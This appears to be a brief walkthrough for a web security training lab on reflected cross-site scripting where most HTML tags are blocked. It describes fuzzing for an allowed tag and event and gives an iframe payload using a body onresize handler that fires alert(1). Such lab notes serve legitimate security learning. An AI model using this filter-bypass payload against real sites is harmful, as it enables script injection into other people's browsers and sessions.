# Lab 14 — Reflected XSS Most Tags Blocked (PRACTITIONER)

## Approach
Fuzz allowed tags → `<body>` allowed. Fuzz events → `onresize` allowed.

## Payload (via iframe)
```html
<iframe src="https://target/search?search=<body onresize=alert(1)>"
  onload="this.style.width='100px'">
```
